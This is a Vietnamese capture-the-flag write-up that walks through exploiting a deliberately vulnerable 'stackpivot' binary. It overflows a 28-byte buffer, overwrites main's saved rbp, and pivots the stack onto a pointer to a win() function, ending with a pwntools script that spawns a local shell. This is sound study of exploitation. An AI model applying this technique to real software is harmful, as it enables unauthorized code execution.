# *Challenge: stackpivot*
***

- **Stack pivot** là kỹ thuật thay đổi giá trị của thanh ghi rsp/rbp (trên hệ thống x86_64) để nó trỏ đến một vùng nhớ khác, thường là vùng bạn có thể điều khiển nội dung. Mục tiêu: Sau khi pivot, bạn dùng các ROP gadget ở vùng nhớ mới để điều khiển luồng thực thi.
**- Các chế độ bảo vệ ảnh hưởng đến stackpivot:**
 ```
 | **Cơ chế bảo vệ** | **Bật có ảnh hưởng đến stack pivot không?** | **Ghi chú**                                                |
| ----------------- | ------------------------------------------- | ---------------------------------------------------------- |
| Canary            | ✅ Có ảnh hưởng                              | Không ghi đè được return address nếu chưa bypass canary    |
| NX (No-eXecute)   | ❌ Không ảnh hưởng trực tiếp                 | Stack pivot dùng ROP, không cần thực thi shellcode         |
| ASLR              | ✅ Có ảnh hưởng                              | Phải biết địa chỉ `.bss`, ROP chain,… để pivot đúng        |
| PIE               | ✅ Có ảnh hưởng                              | `.text`, `.bss`, `.data` bị random hóa → cần leak base ELF |
| RELRO             | ❌ Không ảnh hưởng                           | Chỉ ảnh hưởng đến việc ghi vào GOT, không liên quan stack  |

 ```
*- Với file chall:*
 ```sh
 pwndbg> checksec
File:     /mnt/d/Documents/ISP/TASK1/5_stack_pivot/stackpivot
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
pwndbg>
```
- No canary ->  có thể buffer overflow ghi dè đc rip
- NX -> ko thực thi đc shellcode trên stack nhưng không ảnh hưởng đến stackpivot
- No PIE -> địa chỉ tĩnh ko cần leak base
**Xem pseudo code ở IDA xem, chương trình hoạt động ntn:**
- Chương trình gồm 4 hàm chính: main(), buy(), sell(), win().
Mô tả chương trình hoạt động: chương sẽ cho nhập vô hạn 3 lựa chọn. nếu ta nhập 1 thực hiện hàm buy, trong hàm buy cũng có 3 lựa chọn 1 2 3, cho nhập 1 chuỗi 28 kí tự rồi kết thúc hàm. Ta nhập 2 sẽ thực hiện hàm sell() in ra 1 chuỗi “I have nothing to sell” rồi kết thúc hàm. Nếu ta chọn 3 thì kết thúc hàm main.
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[2]; // [rsp+Eh] [rbp-2h] BYREF

  ((void (__fastcall *)(int, const char **, const char **))init)(argc, argv, envp);
  qword_404850 = (__int64)win;
  puts("Welcome human!");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("1. Buy");
        puts("2. Sell");
        puts("3. Exit");
        printf("> ");
        read(0, buf, 2uLL);
        if ( buf[0] != '1' )
          break;
        buy();
      }
      if ( buf[0] != '2' )
        break;
      sell();
    }
    if ( buf[0] == '3' )
      break;
    puts("Invalid choice!");
  }
  puts("Thanks for coming!");
  return 0;
}
```
```c
__int64 buy()
{
  __int64 result; // rax
  char buf[28]; // [rsp+0h] [rbp-20h] BYREF
  int v2; // [rsp+1Ch] [rbp-4h]

  v2 = 0;
  puts("1. Apple");
  puts("2. Banana");
  puts("3. Cambridge IELTS Volumn 4");
  printf("> ");
  v2 = read(0, buf, 40uLL);
  result = (unsigned __int8)buf[v2 - 1];
  if ( (_BYTE)result == '\n' )
  {
    result = v2 - 1;
    buf[result] = '\0';
  }
  return result;
}
```
```c
int sell()
{
  return puts("I have nothing to sell");
}
```
```c
int win()
{
  return system("/bin/sh");
}
```
**-Mục tiêu: ta phải chiếm được hàm win()**
* Nhận diện stackpivot:
- Nhận thấy trong hàm buy() chuỗi buf khai báo 28 kí tử mà cho nhập 40 kí tự -> lỗi buffer overflow 
- Thử nhập tối đa 40 byte rác vào buf thử xem có bị overwrite cái nào ko
```sh
 RBP  0x7fffffffdd50 ◂— 0x6161616161616165 ('eaaaaaaa')
 RSP  0x7fffffffdd30 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaa('
*RIP  0x40125e (buy+97) ◂— mov eax, dword ptr [rbp - 4]
```
-> Ta thấy rbp bị thay đổi còn rip thì không
- Do rbp không phải 1 địa chỉ hợp lệ vì khi lấy biến ra để để ghi dữ liệu thì bị lỗi
- Vậy ta phải thay đổi rbp thành 1 giá trị hợp lệ thì ta sẽ dùng bất kì địa chỉ nào mà ta biết do No PIE nên các địa chỉ là tĩnh nên ta có thể thay thành các địa chỉ trong file binary.
##### **Viết script:**
- Đầu tiên ta sẽ tìm offset từ buf đến rbp bằng cyclic:
 ```sh
 pwndbg> cyclic -l eaaaaaaa
Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
Found at offset 32
pwndbg>
```
- Sau đó ta sẽ tìm 1 địa chỉ trong file có quyền write. Ta thấy có địa chỉ 0x404000 có thể read và write đc nên ta dùng lệnh x/50xg 0x406000 để tìm 1 địa chỉ trống chưa có giá trị để write vào. 
 
-> Chọn bừa địa chỉ 0x404880 để debug xem như nào
- Ta có script:
 ```py
 p.sendline(b'1')
payload = b'a'*32 + p64(0x404850 - 8)

p.sendafter(b'> ',payload)
```
- Giờ thử debug động quan sát:
  
-> Khi vẫn còn ở trong hàm buy khi mình gửi liệu rồi thì cái rbp nó lại chính là địa chỉ rbp của hàm main -> tức là chương trình cho phép ta overwrite đc rbp của chính hàm main luôn
 
- khi read xong thì ta thấy địa chỉa rbp của hàm main bởi overwrite giống địa chỉ mà mình gửi trong payload

```c
qword_404850 = (__int64)win;
```
 Nhìn lại ở đầu hàm main trong ida ta thấy hàm win đc khai báo vào trong con trỏ qword_404850. Địa chỉ 0x404850 cũng là 1 địa chỉ của file binary luôn. Giờ ta sẽ đi kiểm tra
 ```sh
 pwndbg> x/50xg 0x404800
0x404800 <what_is_this+1952>:   0x0000000000000000      0x0000000000000000
0x404810 <what_is_this+1968>:   0x0000000000000000      0x0000000000000000
0x404820 <what_is_this+1984>:   0x0000000000000000      0x0000000000000000
0x404830 <what_is_this+2000>:   0x0000000000000000      0x0000000000000000
0x404840 <what_is_this+2016>:   0x0000000000000000      0x0000000000000000
0x404850 <what_is_this+2032>:   0x0000000000401366      0x0000000000000000
0x404860:       0x0000000000000000      0x0000000000000000
```
-> 0x404850 chính là địa chỉ của hàm win.
 -> Ý tưởng: mình sẽ tìm cách ret ở hàm main vào đúng địa chỉ của hàm win
- Ta sẽ thử p.sendline(b’3’) kết thúc chương trình rồi đặt breakpoint ở đúng return xem chương trình hoạt động như nào
 
-> ta thấy địa chỉ tại rsp đã bị đẩy lên 8 byte (0x404880 -> 0x404888) và do ở xunh quanh địa chỉ 0x404880 ko có dữ liệu gì hết nên chương trình sẽ exit mà ko thực hiện gì
-> nên giờ ta sẽ lấy cái địa chỉ hàm win ta tìm đc kia sau đó trừ đi 8 byte để sau khi chạy qua leave đến ret thì ta sẽ ret hàm đúng địa chỉ của hàm win, nên ta có script cuối cùng
 ```py
 p.sendline(b'1')
payload = b'a'*32 + p64(0x404850 - 8)

p.sendafter(b'> ',payload)
p.sendafter(b'> ', b'3')
```
*Giải thích : trước khi thực hiện lệnh ret ta thực hiện lệnh leave.
Ta có leave = mov rsp, rbp ; pop rbp 
- Do pop rbp lấy 8 byte từ rsp, gán cho rbp và sau đó rsp += 8, nên tổng cộng hàm leave mất 8 byte dữ liệu trên stack. Do đó khi ta overwrite đc rbp của main thì ta sẽ pass địa chỉ chỉ của hàm win – đi 8 byte để sau khi thực hiện lệnh ret vào đúng hàm win.
- Check thử bằng debug động
 -> Chính xác
- Giờ gửi script xem chiếm đc shell trên LOCAL chưa:
 ```sh
 $ python3 solve.py
[+] Starting local process '/mnt/d/Documents/ISP/TASK1/5_stack_pivot/stackpivot': pid 585
[*] Switching to interactive mode
1. Buy
2. Sell
3. Exit
> Thanks for coming!
$
$ whoami
d1nhdwc
$ ls
'~$eport5.docx'   report5.md   stackpivot
 report5.docx     solve.py     stackpivot.i64
$
```
-> Đã chiếm đc shell


